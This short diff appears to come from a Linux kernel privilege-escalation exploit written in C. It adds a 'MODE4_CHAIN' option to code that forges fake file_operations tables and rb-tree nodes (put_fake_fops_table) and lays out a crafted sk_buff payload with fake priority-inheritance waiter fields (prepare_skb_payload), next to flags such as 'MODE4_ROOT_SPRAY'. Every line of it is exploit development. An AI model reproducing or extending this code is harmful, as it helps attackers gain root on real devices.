@@ -406,7 +406,8 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
    */
   int rb_leaf = env_flag("MODE4_FOPS_RB_LEAF", 0) ||
                 env_flag("MODE4_ION_SAFE", 0) ||
-                env_flag("MODE4_ROOT_SPRAY", 0);
+                env_flag("MODE4_ROOT_SPRAY", 0) ||
+                env_flag("MODE4_CHAIN", 0);
   if (rb_leaf) {
     put64(p, off + 0x00, 1); /* BLACK, parent NULL */
     put64(p, off + 0x08, 0); /* rb_right / llseek NULL */
@@ -888,6 +889,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     else if (env_flag("MODE4_CLASSIC_SAFE", 0) ||
              env_flag("MODE4_CLASSIC_NOP", 0) ||
              env_flag("MODE4_ZERO_NAME", 0) ||
+             env_flag("MODE4_CHAIN", 0) ||
              env_flag("MODE4_LOCK_OWNER0", 0))
       /* Stack prio=200; W0 must stay top after re-enqueue (lower prio number). */
       put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, 100);
